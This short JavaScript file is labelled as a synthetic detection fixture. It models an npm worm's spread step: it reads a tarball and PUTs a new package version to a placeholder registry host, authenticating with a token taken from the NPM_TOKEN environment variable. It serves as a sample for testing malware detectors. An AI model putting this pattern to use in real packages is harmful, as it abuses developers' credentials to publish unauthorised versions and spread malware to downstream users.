// FIXTURE ONLY — synthetic detection test sample, not real malware
// Install-time worm shape: publish a new version by PUTting the publish document directly.
const fs = require("fs");
async function spread(name, version, tgzPath, token) {
  const tgz = fs.readFileSync(tgzPath);
  const body = JSON.stringify({
    name,
    versions: { [version]: { name, version } },
    "dist-tags": { latest: version },
    _attachments: { [`${name}-${version}.tgz`]: { data: tgz.toString("base64") } },
  });
  await fetch(`https://registry.example.invalid/${name}`, {
    method: "PUT", headers: { authorization: `Bearer ${token}` }, body,
  });
}
spread("fixture-string-pad", "0.3.1", "/tmp/p.tgz", process.env.NPM_TOKEN);
